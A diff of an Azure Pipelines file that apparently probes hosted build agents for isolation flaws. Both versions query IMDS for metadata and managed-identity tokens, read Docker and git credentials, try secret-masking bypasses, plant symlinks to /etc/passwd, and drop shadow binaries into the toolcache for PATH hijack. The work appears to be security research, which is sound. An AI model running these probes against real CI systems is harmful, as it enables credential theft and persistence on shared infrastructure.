@@ -1,314 +1,274 @@
-# Forensic & Isolation Mega-Sweep (safe, non-blocking)
+# azure-pipelines.yml
+# One file that plants probes, publishes artifacts, and verifies impact in fresh jobs.
+# Focus areas:
+#  - Toolcache persistence & PATH hijack attempt
+#  - Artifact downloader symlink / traversal behavior
+#  - Secret-in-argv leakage probe
+#  - IMDS reachability from a containerized job
+# All steps are self-contained and publish small artifacts as proof.
+
 trigger:
 - main
+
 pr:
 - main
 
-name: "$(Date:yyyyMMdd)$(Rev:.r)"
-
 variables:
-  ART_DIR: "$(Build.SourcesDirectory)/artifacts"
-  ART_DIR_IMDS: "$(Build.SourcesDirectory)/artifacts-imds"
-  ART_DIR_DOCKER: "$(Build.SourcesDirectory)/artifacts-docker"
-  ART_DIR_SERVICE: "$(Build.SourcesDirectory)/artifacts-serviceiso"
-  ART_DIR_PERSIST: "$(Build.SourcesDirectory)/artifacts-persist"
-  ART_DIR_SYMLINK: "$(Build.SourcesDirectory)/artifacts-symlink"
-  ART_DIR_MASKING: "$(Build.SourcesDirectory)/artifacts-masking"
-  ART_DIR_ARGV: "$(Build.SourcesDirectory)/artifacts-argv"
-  ART_DIR_GIT: "$(Build.SourcesDirectory)/artifacts-git"
-  ART_DIR_CACHE: "$(Build.SourcesDirectory)/artifacts-cache"
-  ART_DIR_DAEMON: "$(Build.SourcesDirectory)/artifacts-daemon"
-  ART_DIR_TOOLCACHE: "$(Build.SourcesDirectory)/artifacts-toolcache"
-  ART_DIR_LOCALHOST: "$(Build.SourcesDirectory)/artifacts-localhost"
+  VM_IMAGE: 'ubuntu-22.04'
+  # Unique run marker to correlate artifacts across jobs in this same pipeline run
+  RUN_MARK: 'MARK_$(Build.BuildId)_$(System.JobAttempt)'
 
-  # Optional inputs for REST/API scoping tests (leave empty to skip)
-  # Set these in the pipeline UI/variable group only if you own the target.
-  OTHER_PROJECT_ORG_URL: ""   # e.g., https://dev.azure.com/YourOrg/YourProject
-  DEVOPS_PAT: ""              # PAT with minimal read scope to YOUR assets only
+stages:
+- stage: VulnProbes
+  displayName: Forensics & Probes
+  jobs:
 
-  # Optional dummy secret to test masking bypass (set as secret variable in UI)
-  DUMMY_SECRET: ""
+  # -----------------------------
+  # JOB 1: Seed + publish artifacts
+  # -----------------------------
+  - job: seed_and_publish
+    displayName: "Seed: toolcache, symlinks, and argv leak"
+    pool:
+      vmImage: $(VM_IMAGE)
+    steps:
+      - bash: |
+          set -euo pipefail
+          echo "== Host identity & timing =="
+          date -u
+          uname -a
+          id
+          echo "== /etc fingerprints =="
+          echo "--- /etc/machine-id ---"; cat /etc/machine-id || true
+          echo "--- /etc/os-release ---"; sed -n '1,200p' /etc/os-release || true
+          echo
+          echo "== Prepare artifacts tree =="
+          rm -rf artifacts-* || true
+          mkdir -p artifacts-symlink artifacts-argv artifacts-toolcache artifacts-seed
+          echo "$(RUN_MARK) $(Build.QueuedBy) $(Build.SourceVersion)" | tee artifacts-seed/run_mark.txt
 
-pool:
-  vmImage: "ubuntu-22.04"
+          echo
+          echo "== Symlink payloads (safe targets) =="
+          # Absolute symlink pointing to host file (harmless on its own, used to test downloader behavior)
+          ln -s /etc/hosts artifacts-symlink/abs_to_etc_hosts
+          # Relative symlink pointing up out of extraction directory (if downloader honors raw symlinks)
+          mkdir -p artifacts-symlink/deep/inside
+          ( cd artifacts-symlink/deep/inside && ln -s ../../../../etc/passwd rel_escape_to_etc_passwd )
+          # A file whose NAME looks traversal-ish (but is just a name in FS)
+          touch 'artifacts-symlink/..__not_traversal__'
 
-jobs:
-- job: sweep
-  displayName: "Forensic & Isolation Checks (safe)"
-  steps:
-  - checkout: self
-    clean: true
+          echo
+          echo "== Toolcache seed & PATH-hijack attempt =="
+          echo "AGENT_TOOLSDIRECTORY=${AGENT_TOOLSDIRECTORY:-/opt/hostedtoolcache}"
+          TC_DIR="${AGENT_TOOLSDIRECTORY:-/opt/hostedtoolcache}"
+          SHADOW_DIR="$TC_DIR/shadow/bin"
+          mkdir -p "$SHADOW_DIR"
+          # Drop 'node' and 'echo' wrappers that log invocation to a file if ever executed
+          cat > "$SHADOW_DIR/node" <<'EOF'
+          #!/usr/bin/env bash
+          echo "[shadow-node] invoked: $0 $*" >> "$HOME/shadow-invocations.log"
+          # behave enough like node to not explode most calls
+          if command -v /usr/bin/node >/dev/null 2>&1; then exec /usr/bin/node "$@"; else exec node "$@"; fi
+          EOF
+          cat > "$SHADOW_DIR/echo" <<'EOF'
+          #!/usr/bin/env bash
+          printf "hello-from-shadow "
+          exec /usr/bin/echo "$@"
+          EOF
+          chmod +x "$SHADOW_DIR/node" "$SHADOW_DIR/echo"
 
-  - bash: |
-      set -u
-      echo "== Host identity & timing =="
-      date -u +"%Y-%m-%d %H:%M:%S %Z" | tee date_utc.txt
-      uname -a | tee uname.txt
-      id | tee id.txt
-      ls -ld / /home /home/vsts /opt /opt/hostedtoolcache || true
-      echo "== /etc fingerprints =="
-      for f in machine-id os-release hosts hostname resolv.conf; do
-        [ -r "/etc/$f" ] && { echo "--- /etc/$f ---"; sed -n '1,200p' "/etc/$f"; } || echo "no /etc/$f"
-      done | tee etc_fingerprints.txt
-      mkdir -p "$(ART_DIR)"
-      mv date_utc.txt uname.txt id.txt etc_fingerprints.txt "$(ART_DIR)/" || true
-    displayName: "Machine identity & timing"
-    continueOnError: true
+          # Write presence markers in a few common locations
+          for p in /var/tmp /tmp "$TC_DIR" /usr/local/share ; do
+            fn="$p/.${RUN_MARK}"
+            (echo "${RUN_MARK} $(date -u +%FT%TZ)" > "$fn" 2>/dev/null && echo "wrote $fn") || echo "no perms for $p"
+          done
 
-  # 1) IMDS (169.254.169.254) – must be blocked; short timeouts
-  - bash: |
-      set -u
-      mkdir -p "$(ART_DIR_IMDS)"
-      IMDS_BASE="http://169.254.169.254"
-      echo "== IMDS instance query (should be blocked) ==" | tee "$(ART_DIR_IMDS)/imds.txt"
-      curl -sS --connect-timeout 1 --max-time 2 \
-        -H "Metadata:true" \
-        "$IMDS_BASE/metadata/instance?api-version=2021-02-01" \
-        -D - -o - | sed -n '1,200p' | tee -a "$(ART_DIR_IMDS)/imds.txt" || echo "[curl failed]" | tee -a "$(ART_DIR_IMDS)/imds.txt"
-      echo "== IMDS MSI token probe (should be blocked) ==" | tee -a "$(ART_DIR_IMDS)/imds.txt"
-      curl -sS --connect-timeout 1 --max-time 2 \
-        -H "Metadata:true" \
-        "$IMDS_BASE/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F" \
-        -D - -o - | sed -n '1,120p' | tee -a "$(ART_DIR_IMDS)/imds.txt" || echo "[curl failed]" | tee -a "$(ART_DIR_IMDS)/imds.txt"
-    displayName: "IMDS exposure checks (safe)"
-    continueOnError: true
+          # Save proof of world-writable perms for the toolcache
+          (ls -ld "$TC_DIR" && ls -la "$TC_DIR") > artifacts-toolcache/toolcache_listing.txt
 
-  - task: PublishPipelineArtifact@1
-    displayName: "Publish IMDS artifacts"
-    inputs:
-      targetPath: "$(ART_DIR_IMDS)"
-      artifact: "imds-proof"
-    continueOnError: true
+          echo
+          echo "== Secret-argv leak probe setup =="
+          # If DUMMY_SECRET isn't pre-set in pipeline, generate one and mark as secret for subsequent steps
+          if [ -z "${DUMMY_SECRET:-}" ]; then
+            gen="dummy-$(openssl rand -hex 8 || date +%s%N)"
+            echo "##vso[task.setvariable variable=DUMMY_SECRET;issecret=true]$gen"
+            echo "(Set runtime secret DUMMY_SECRET)"
+          else
+            echo "(Using pre-provided DUMMY_SECRET)"
+          fi
+        displayName: "Seed: identify, symlinks, toolcache, and secret init"
 
-  # 2) Docker registry/session credentials
-  - bash: |
-      set -u
-      mkdir -p "$(ART_DIR_DOCKER)"
-      echo "== docker version/info ==" | tee "$(ART_DIR_DOCKER)/docker_info.txt"
-      ( docker version && docker info ) 2>&1 | tee -a "$(ART_DIR_DOCKER)/docker_info.txt" || echo "docker not available" | tee -a "$(ART_DIR_DOCKER)/docker_info.txt"
-      echo "== ~/.docker/config.json (if any) ==" | tee -a "$(ART_DIR_DOCKER)/docker_info.txt"
-      [ -f "$HOME/.docker/config.json" ] && sed -n '1,200p' "$HOME/.docker/config.json" | tee -a "$(ART_DIR_DOCKER)/docker_info.txt" || echo "no client config"
-    displayName: "Docker creds / session presence"
-    continueOnError: true
+      - task: PublishPipelineArtifact@1
+        displayName: "Publish: toolcache proof"
+        inputs:
+          targetPath: artifacts-toolcache
+          artifactName: toolcache-proof
+          publishLocation: pipeline
 
-  - task: PublishPipelineArtifact@1
-    displayName: "Publish docker artifacts"
-    inputs:
-      targetPath: "$(ART_DIR_DOCKER)"
-      artifact: "docker-proof"
-    continueOnError: true
+      - task: PublishPipelineArtifact@1
+        displayName: "Publish: symlink payloads"
+        inputs:
+          targetPath: artifacts-symlink
+          artifactName: symlink-proof
+          publishLocation: pipeline
 
-  # 3) Service-container / container isolation (best-effort, only if docker works)
-  - bash: |
-      set -u
-      mkdir -p "$(ART_DIR_SERVICE)"
-      echo "== Container isolation probe ==" | tee "$(ART_DIR_SERVICE)/service_iso.txt"
-      if docker info >/dev/null 2>&1; then
-        echo "[pull test image]" | tee -a "$(ART_DIR_SERVICE)/service_iso.txt"
-        docker pull --quiet nginx:alpine || true
-        echo "[run nginx on 127.0.0.1:65432]" | tee -a "$(ART_DIR_SERVICE)/service_iso.txt"
-        docker rm -f iso_nginx >/dev/null 2>&1 || true
-        docker run -d --name iso_nginx -p 127.0.0.1:65432:80 nginx:alpine >/dev/null 2>&1 || true
-        sleep 2
-        echo "[host curl 127.0.0.1:65432]" | tee -a "$(ART_DIR_SERVICE)/service_iso.txt"
-        curl -sS --connect-timeout 1 --max-time 2 -D - -o /dev/null http://127.0.0.1:65432 | tee -a "$(ART_DIR_SERVICE)/service_iso.txt" || echo "curl failed" | tee -a "$(ART_DIR_SERVICE)/service_iso.txt"
-        echo "[try docker exec]" | tee -a "$(ART_DIR_SERVICE)/service_iso.txt"
-        docker exec iso_nginx sh -c 'ps; netstat -tuln || ss -tuln || true' 2>&1 | tee -a "$(ART_DIR_SERVICE)/service_iso.txt" || true
-        docker rm -f iso_nginx >/dev/null 2>&1 || true
-      else
-        echo "docker unavailable; skipping"
-      fi
-    displayName: "Service/container isolation – minimal"
-    continueOnError: true
+      - bash: |
+          set -euo pipefail
+          echo "== First-party-style argv exposure check =="
+          echo "Marker: ARGV_LEAK_$(Build.BuildId)_$$" | tee artifacts-argv/marker.txt
 
-  - task: PublishPipelineArtifact@1
-    displayName: "Publish service/container artifacts"
-    inputs:
-      targetPath: "$(ART_DIR_SERVICE)"
-      artifact: "service-iso-proof"
-    continueOnError: true
+          # Spawn a short-lived process that includes the secret in ARGV (simulates a task passing secrets via args)
+          # NOTE: Doing this intentionally to test if /proc reveals the value while the process runs.
+          if [ -z "${DUMMY_SECRET:-}" ]; then
+            echo "No DUMMY_SECRET available; skipping argv test." | tee -a artifacts-argv/argv.txt
+            exit 0
+          fi
 
-  # 4) Cross-run persistence markers
-  - bash: |
-      set -u
-      mkdir -p "$(ART_DIR_PERSIST)"
-      MARKER="MARK_$(date +%s)_$RANDOM"
-      echo "$MARKER $(date -Is -u)" | tee "$(ART_DIR_PERSIST)/marker.txt"
-      echo "$MARKER" > "$(Build.SourcesDirectory)/.marker.$MARKER"
-      for p in /var/tmp "/tmp" "/usr/local/share" "/opt/hostedtoolcache" ; do
-        echo "writing to $p" | tee -a "$(ART_DIR_PERSIST)/write_log.txt"
-        echo "$MARKER $(date -Is -u)" > "$p/.$MARKER" 2>>"$(ART_DIR_PERSIST)/write_log.txt" || echo "no perms for $p" | tee -a "$(ART_DIR_PERSIST)/write_log.txt"
-      done
-      echo "Re-run a fresh job later to check for .$MARKER existence in the same paths." | tee -a "$(ART_DIR_PERSIST)/write_log.txt"
-    displayName: "Cross-run persistence markers"
-    continueOnError: true
+          # Run a child bash with the secret as an argument; in parallel, scan /proc for it.
+          ( sleep 0.5; ps -eo pid,ppid,user,cmd | tee artifacts-argv/ps_snapshot.txt | grep -F -- "$DUMMY_SECRET" && echo "FOUND in ps" | tee -a artifacts-argv/argv.txt || echo "NOT_FOUND in ps" | tee -a artifacts-argv/argv.txt ) &
 
-  - task: PublishPipelineArtifact@1
-    displayName: "Publish persistence artifacts"
-    inputs:
-      targetPath: "$(ART_DIR_PERSIST)"
-      artifact: "persistence-proof"
-    continueOnError: true
+          /usr/bin/bash -c 'sleep 2' "${DUMMY_SECRET}" || true
 
-  # 5) Artifact publisher symlink traversal
-  - bash: |
-      set -u
-      mkdir -p "$(ART_DIR_SYMLINK)/payload"
-      ln -s /etc/hostname "$(ART_DIR_SYMLINK)/payload/escape_hostname" || true
-      ln -s /etc/issue "$(ART_DIR_SYMLINK)/payload/escape_issue" || true
-      echo "Created symlinks to host files inside artifact tree." | tee "$(ART_DIR_SYMLINK)/readme.txt"
-    displayName: "Symlink traversal test (safe files)"
-    continueOnError: true
+          # Also check /proc/<pid>/cmdline style for any survivors
+          for pid in $(pgrep -f sleep || true); do
+            tr '\0' ' ' < /proc/$pid/cmdline | tee -a artifacts-argv/cmdlines.txt || true
+          done
 
-  - task: PublishPipelineArtifact@1
-    displayName: "Publish symlink traversal artifacts"
-    inputs:
-      targetPath: "$(ART_DIR_SYMLINK)"
-      artifact: "symlink-proof"
-    continueOnError: true
+          echo "Done."
+        displayName: "Probe: secret present in ARGV?"
+        env:
+          DUMMY_SECRET: $(DUMMY_SECRET)
 
-  # 6) Secret masking bypass surface (only if DUMMY_SECRET set as secret in UI)
-  - bash: |
-      set -u
-      mkdir -p "$(ART_DIR_MASKING)"
-      echo "== Secret masking bypass self-test ==" | tee "$(ART_DIR_MASKING)/masking.txt"
-      if [ -n "${DUMMY_SECRET:-}" ]; then
-        echo "Length: ${#DUMMY_SECRET}" | tee -a "$(ART_DIR_MASKING)/masking.txt"
-        echo "[plain]";            echo "$DUMMY_SECRET" | tee -a "$(ART_DIR_MASKING)/masking.txt"
-        echo "[ZWSP inserted]";    printf '%s\n' "$(echo "$DUMMY_SECRET" | sed 's/./&\u200b/g')" | tee -a "$(ART_DIR_MASKING)/masking.txt"
-        echo "[split lines]";      printf '%s\n' "${DUMMY_SECRET%????}" | tee -a "$(ART_DIR_MASKING)/masking.txt"; printf '%s\n' "${DUMMY_SECRET: -4}" | tee -a "$(ART_DIR_MASKING)/masking.txt"
-        echo "[ANSI escape]";      printf '\033[0m%s\033[0m\n' "$DUMMY_SECRET" | tee -a "$(ART_DIR_MASKING)/masking.txt"
-      else
-        echo "DUMMY_SECRET not set; skipping" | tee -a "$(ART_DIR_MASKING)/masking.txt"
-      fi
-    displayName: "Secret masking bypass (non-fatal)"
-    continueOnError: true
+      - task: PublishPipelineArtifact@1
+        displayName: "Publish: argv-leak artifacts"
+        inputs:
+          targetPath: artifacts-argv
+          artifactName: argv-leak-proof
+          publishLocation: pipeline
 
-  - task: PublishPipelineArtifact@1
-    displayName: "Publish masking artifacts"
-    inputs:
-      targetPath: "$(ART_DIR_MASKING)"
-      artifact: "masking-proof"
-    continueOnError: true
+  # ------------------------------------
+  # JOB 2: Fresh VM — test downloader & symlink handling
+  # ------------------------------------
+  - job: download_and_validate
+    displayName: "Validate: artifact download behavior (symlinks/traversal)"
+    dependsOn: seed_and_publish
+    pool:
+      vmImage: $(VM_IMAGE)
+    steps:
+      - task: DownloadPipelineArtifact@2
+        displayName: "Download symlink-proof"
+        inputs:
+          buildType: 'current'
+          artifactName: 'symlink-proof'
+          targetPath: 'dl-symlink'
 
-  # 7) argv leakage while process runs
-  - bash: |
-      set -u
-      mkdir -p "$(ART_DIR_ARGV)"
-      LEAK_MARKER="ARGV_LEAK_$(date +%s)_$RANDOM"
-      echo "Marker: $LEAK_MARKER" | tee "$(ART_DIR_ARGV)/marker.txt"
-      ( python3 -c 'import time; time.sleep(25)' "$LEAK_MARKER" & echo $! > "$(ART_DIR_ARGV)/pid.txt" )
-      sleep 2
-      ps -eo pid,ppid,user,cmd | sed -n '1,200p' | tee "$(ART_DIR_ARGV)/ps_snapshot.txt" || true
-      for p in /proc/*/cmdline; do
-        (tr '\0' ' ' < "$p" 2>/dev/null | grep -F "$LEAK_MARKER") && echo "found in: $p" || true
-      done | tee "$(ART_DIR_ARGV)/proc_cmdline_hits.txt"
-    displayName: "Process argv leakage probe"
-    continueOnError: true
+      - bash: |
+          set -euo pipefail
+          echo "== Inspect downloaded files =="
+          mkdir -p artifacts-verify
+          ( set -x
+            ls -lR dl-symlink | sed -n '1,300p' | tee artifacts-verify/ls_dl.txt
+            file dl-symlink/* || true
+            # Show what the symlinks point to (if created as symlinks)
+            for f in dl-symlink/* dl-symlink/**/rel_escape_to_etc_passwd 2>/dev/null; do
+              [ -L "$f" ] && echo "$f -> $(readlink -f "$f")" | tee -a artifacts-verify/readlinks.txt || true
+            done
+            # Attempt to read through the symlink (this would read THIS VM's host file if symlink is honored)
+            for f in dl-symlink/abs_to_etc_hosts dl-symlink/deep/inside/rel_escape_to_etc_passwd ; do
+              if [ -e "$f" ]; then
+                echo "--- BEGIN $f ---" | tee -a artifacts-verify/cat_results.txt
+                (cat "$f" | head -n 10 || true) | tee -a artifacts-verify/cat_results.txt
+                echo "--- END $f ---" | tee -a artifacts-verify/cat_results.txt
+              else
+                echo "Missing $f" | tee -a artifacts-verify/cat_results.txt
+              fi
+            done
+          )
+        displayName: "Check if downloader restored symlinks and if they dereference"
 
-  - task: PublishPipelineArtifact@1
-    displayName: "Publish argv artifacts"
-    inputs:
-      targetPath: "$(ART_DIR_ARGV)"
-      artifact: "argv-leak-proof"
-    continueOnError: true
+      - task: PublishPipelineArtifact@1
+        displayName: "Publish: downloader verification"
+        inputs:
+          targetPath: artifacts-verify
+          artifactName: symlink-download-proof
+          publishLocation: pipeline
 
-  # 8) Git credential header leakage
-  - bash: |
-      set -u
-      mkdir -p "$(ART_DIR_GIT)"
-      echo "== git extraheader =="? | tee "$(ART_DIR_GIT)/git_headers.txt"
-      git config --get-regexp '.*extraheader' 2>&1 | tee -a "$(ART_DIR_GIT)/git_headers.txt" || echo "none" | tee -a "$(ART_DIR_GIT)/git_headers.txt"
-      echo "--- .git/config (head) ---" | tee -a "$(ART_DIR_GIT)/git_headers.txt"
-      sed -n '1,200p' "$(Build.SourcesDirectory)/.git/config" 2>/dev/null | tee -a "$(ART_DIR_GIT)/git_headers.txt" || echo "no .git/config"
-    displayName: "Git header leakage"
-    continueOnError: true
+  # ------------------------------------
+  # JOB 3: Fresh VM — persistence & toolcache hijack check
+  # ------------------------------------
+  - job: persistence_check
+    displayName: "Validate: cross-VM persistence & PATH hijack feasibility"
+    dependsOn: seed_and_publish
+    pool:
+      vmImage: $(VM_IMAGE)
+    steps:
+      - bash: |
+          set -euo pipefail
+          echo "== Check for persisted markers from previous job on a fresh VM =="
+          mkdir -p artifacts-persist
+          TC_DIR="${AGENT_TOOLSDIRECTORY:-/opt/hostedtoolcache}"
+          for p in /var/tmp /tmp "$TC_DIR" /usr/local/share ; do
+            fn="$p/.${RUN_MARK}"
+            if [ -f "$fn" ]; then
+              echo "FOUND $fn" | tee -a artifacts-persist/findings.txt
+            else
+              echo "NOT_FOUND $fn" | tee -a artifacts-persist/findings.txt
+            fi
+          done
 
-  - task: PublishPipelineArtifact@1
-    displayName: "Publish git-header artifacts"
-    inputs:
-      targetPath: "$(ART_DIR_GIT)"
-      artifact: "git-header-proof"
-    continueOnError: true
+          echo
+          echo "== Try PATH hijack using toolcache/shadow if it exists =="
+          if [ -d "$TC_DIR/shadow/bin" ]; then
+            export PATH="$TC_DIR/shadow/bin:$PATH"
+            echo "PATH prepended with $TC_DIR/shadow/bin" | tee -a artifacts-persist/findings.txt
+            # If our shadow 'echo' exists, we should see the marker
+            echo "invocation-test" | tee -a artifacts-persist/echo_out.txt
+            # If 'node' is shadowed, this will log into $HOME/shadow-invocations.log
+            ( node -v || true ) | tee -a artifacts-persist/node_out.txt
+            [ -f "$HOME/shadow-invocations.log" ] && cp "$HOME/shadow-invocations.log" artifacts-persist/ || true
+          else
+            echo "No shadow bin dir present." | tee -a artifacts-persist/findings.txt
+          fi
+        displayName: "Probe: persistence & PATH hijack"
 
-  # 9) Artifact/cache API over-scoping (skips if vars not set)
-  - bash: |
-      set -u
-      mkdir -p "$(ART_DIR_CACHE)"
-      echo "== Artifact/cache API scoping check ==" | tee "$(ART_DIR_CACHE)/scope.txt"
-      if [ -n "${OTHER_PROJECT_ORG_URL:-}" ] && [ -n "${DEVOPS_PAT:-}" ]; then
-        AUTH="$(printf ':%s' "$DEVOPS_PAT" | base64 -w0)"
-        URL="$OTHER_PROJECT_ORG_URL/_apis/build/builds?api-version=7.1-preview.7"
-        echo "GET $URL" | tee -a "$(ART_DIR_CACHE)/scope.txt"
-        curl -sS --connect-timeout 3 --max-time 6 -H "Authorization: Basic $AUTH" "$URL" | sed -n '1,160p' | tee -a "$(ART_DIR_CACHE)/scope.txt" || echo "request failed" | tee -a "$(ART_DIR_CACHE)/scope.txt"
-      else
-        echo "vars not set; skipping" | tee -a "$(ART_DIR_CACHE)/scope.txt"
-      fi
-    displayName: "Artifact/cache scoping (opt-in)"
-    continueOnError: true
+      - task: PublishPipelineArtifact@1
+        displayName: "Publish: persistence findings"
+        inputs:
+          targetPath: artifacts-persist
+          artifactName: persistence-proof
+          publishLocation: pipeline
 
-  - task: PublishPipelineArtifact@1
-    displayName: "Publish cache-scope artifacts"
-    inputs:
-      targetPath: "$(ART_DIR_CACHE)"
-      artifact: "cache-scope-proof"
-    continueOnError: true
+  # ------------------------------------
+  # JOB 4: Run inside a container and probe IMDS
+  # ------------------------------------
+  - job: imds_from_container
+    displayName: "Probe: IMDS reachability from job container"
+    dependsOn: seed_and_publish
+    pool:
+      vmImage: $(VM_IMAGE)
+    container: ubuntu:22.04
+    steps:
+      - bash: |
+          set -euo pipefail
+          apt-get update -qq
+          DEBIAN_FRONTEND=noninteractive apt-get install -y -qq curl ca-certificates >/dev/null
+          mkdir -p artifacts-imds
+          echo "== IMDS instance query (should be blocked or require header) ==" | tee -a artifacts-imds/imds.txt
+          set +e
+          curl -i -s --max-time 2 "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | sed -n '1,80p' | tee -a artifacts-imds/imds.txt
+          echo
+          echo "== IMDS with Metadata:true header ==" | tee -a artifacts-imds/imds.txt
+          curl -i -s -H "Metadata: true" --max-time 3 "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | sed -n '1,120p' | tee -a artifacts-imds/imds.txt
+          echo
+          echo "== MSI token probe (likely 400/401 if no identity) ==" | tee -a artifacts-imds/imds.txt
+          curl -i -s -H "Metadata: true" --max-time 3 \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F" \
+            | sed -n '1,80p' | tee -a artifacts-imds/imds.txt
+          set -e
+        displayName: "IMDS inside container"
 
-  # 10) Orphaned daemon/process survival (agent should kill; we record)
-  - bash: |
-      set -u
-      mkdir -p "$(ART_DIR_DAEMON)"
-      echo "== Orphan probe ==" | tee "$(ART_DIR_DAEMON)/daemon.txt"
-      ( nohup sh -c 'sleep 600' >/dev/null 2>&1 & echo $! > "$(ART_DIR_DAEMON)/sleep.pid" )
-      echo "started sleep pid: $(cat "$(ART_DIR_DAEMON)/sleep.pid")" | tee -a "$(ART_DIR_DAEMON)/daemon.txt"
-    displayName: "Orphan process probe (benign)"
-    continueOnError: true
-
-  - task: PublishPipelineArtifact@1
-    displayName: "Publish orphan artifacts"
-    inputs:
-      targetPath: "$(ART_DIR_DAEMON)"
-      artifact: "orphan-proof"
-    continueOnError: true
-
-  # 11) Toolcache/Path shadowing (non-destructive)
-  - bash: |
-      set -u
-      mkdir -p "$(ART_DIR_TOOLCACHE)"
-      echo "== Toolcache presence & PATH shadowing ==" | tee "$(ART_DIR_TOOLCACHE)/toolcache.txt"
-      echo "AGENT_TOOLSDIRECTORY=${AGENT_TOOLSDIRECTORY:-}" | tee -a "$(ART_DIR_TOOLCACHE)/toolcache.txt"
-      ls -l "${AGENT_TOOLSDIRECTORY:-/opt/hostedtoolcache}" 2>/dev/null | head -n 80 | tee -a "$(ART_DIR_TOOLCACHE)/toolcache.txt" || echo "no access" | tee -a "$(ART_DIR_TOOLCACHE)/toolcache.txt"
-      mkdir -p "$HOME/bin"
-      echo -e '#!/usr/bin/env bash\necho "[shadowed echo] $*"' > "$HOME/bin/echo"
-      chmod +x "$HOME/bin/echo"
-      PATH="$HOME/bin:$PATH" echo hello-from-shadow | tee -a "$(ART_DIR_TOOLCACHE)/toolcache.txt"
-      which echo | tee -a "$(ART_DIR_TOOLCACHE)/toolcache.txt"
-      echo "Note: persistence across fresh VMs would be reportable; this only demonstrates shadowing within this job." | tee -a "$(ART_DIR_TOOLCACHE)/toolcache.txt"
-    displayName: "Toolcache & PATH shadowing"
-    continueOnError: true
-
-  - task: PublishPipelineArtifact@1
-    displayName: "Publish toolcache artifacts"
-    inputs:
-      targetPath: "$(ART_DIR_TOOLCACHE)"
-      artifact: "toolcache-proof"
-    continueOnError: true
-
-  # 12) Localhost boundary confusion (host-only minimal)
-  - bash: |
-      set -u
-      mkdir -p "$(ART_DIR_LOCALHOST)"
-      echo "== Localhost quick probes ==" | tee "$(ART_DIR_LOCALHOST)/localhost.txt"
-      for port in 22 80 2375 2376 3000 5000 8080; do
-        echo "--- 127.0.0.1:$port ---" | tee -a "$(ART_DIR_LOCALHOST)/localhost.txt"
-        curl -sS --connect-timeout 1 --max-time 2 -D - -o /dev/null "http://127.0.0.1:$port" 2>&1 | head -n 6 | tee -a "$(ART_DIR_LOCALHOST)/localhost.txt" || echo "closed" | tee -a "$(ART_DIR_LOCALHOST)/localhost.txt"
-      done
-    displayName: "Localhost boundary probes"
-    continueOnError: true
-
-  - task: PublishPipelineArtifact@1
-    displayName: "Publish localhost artifacts"
-    inputs:
-      targetPath: "$(ART_DIR_LOCALHOST)"
-      artifact: "localhost-proof"
-    continueOnError: true
+      - task: PublishPipelineArtifact@1
+        displayName: "Publish: IMDS container probe"
+        inputs:
+          targetPath: artifacts-imds
+          artifactName: imds-container-proof
+          publishLocation: pipeline
